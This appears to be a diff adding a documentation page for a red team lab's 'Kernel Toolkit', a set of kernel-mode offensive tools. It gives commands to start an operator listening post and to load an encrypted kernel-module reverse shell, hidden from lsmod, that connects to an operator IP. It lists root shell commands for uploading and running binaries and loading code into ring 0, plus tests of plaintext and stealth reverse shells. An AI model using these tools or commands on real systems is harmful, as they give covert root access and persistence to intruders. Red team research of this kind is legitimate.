@@ -1,0 +1,78 @@
+<!-- hovel-doc: {"title":"Kernel Toolkit","group":"picblobs","order":200,"navTitle":"Kernel Toolkit"} -->
+<article>
+<h1 id="kernel-toolkit">Kernel Toolkit</h1>
+<p>The <code>kernel/</code> directory contains kernel-mode tools for the red team lab. See <code>kernel/lab.md</code> for the full lab guide.</p>
+<h2 id="quick-start">Quick start</h2>
+<pre data-lang="bash"><code># Prerequisites
+apt install qemu-system-x86 qemu-utils genisoimage
+
+# Run all kernel tests through Task (downloads Ubuntu cloud image on first run)
+task bazel:test -- //modules/picblobs/kernel:ubuntu_suite
+
+# Interactive VM shell for exploration
+python3 kernel/vm/vm_harness.py shell --distro ubuntu
+</code></pre>
+<h2 id="encrypted-kernel-shell">Encrypted kernel shell</h2>
+<pre data-lang="bash"><code># Generate a key
+KEY=$(python3 -c &quot;import os; print(os.urandom(32).hex())&quot;)
+
+# Start operator listening post
+python3 kernel/lp/listener.py --port 4444 --key $KEY
+
+# On target: load stealth encrypted shell (hidden from lsmod)
+insmod kshell_nacl.ko host=&lt;operator_ip&gt; port=4444 key=$KEY
+</code></pre>
+<p>Shell commands:
+- <code>&lt;cmd&gt;</code> -- run shell command as root
+- <code>!upload &lt;local_file&gt; &lt;remote_path&gt;</code> -- upload file to target
+- <code>!run &lt;path&gt;</code> -- execute uploaded binary
+- <code>!kload &lt;blob_file&gt;</code> -- load PIC blob into ring 0 (runs in its own kthread)
+- <code>exit</code> -- disconnect</p>
+<h2 id="crypto">Crypto</h2>
+<p>All encryption uses embedded TweetNaCl (XSalsa20 + Poly1305). No dependency on the kernel crypto API -- works on kernels 2.6 through latest.</p>
+<h2 id="vm-tests">VM tests</h2>
+<p>The Bazel VM suite currently contains seven Ubuntu 24.04 tests plus an Alpine
+3.21 build smoke test:</p>
+<table>
+<thead>
+<tr>
+<th>Test</th>
+<th>What it verifies</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>kmod_build</code></td>
+<td>Kernel module compiles</td>
+</tr>
+<tr>
+<td><code>kmod_nopanic</code></td>
+<td>Module loads without crashing</td>
+</tr>
+<tr>
+<td><code>kshell</code></td>
+<td>Plaintext reverse shell, uid=0</td>
+</tr>
+<tr>
+<td><code>kshell_nacl</code></td>
+<td>NaCl-encrypted shell connects</td>
+</tr>
+<tr>
+<td><code>kshell_ff</code></td>
+<td>Stealth mode (hidden from lsmod)</td>
+</tr>
+<tr>
+<td><code>kshell_upload</code></td>
+<td>File upload + execution through shell</td>
+</tr>
+<tr>
+<td><code>examples_build</code></td>
+<td>All example modules compile</td>
+</tr>
+<tr>
+<td><code>kmod_build_alpine</code></td>
+<td>Module build smoke test on Alpine</td>
+</tr>
+</tbody>
+</table>
+      </article>
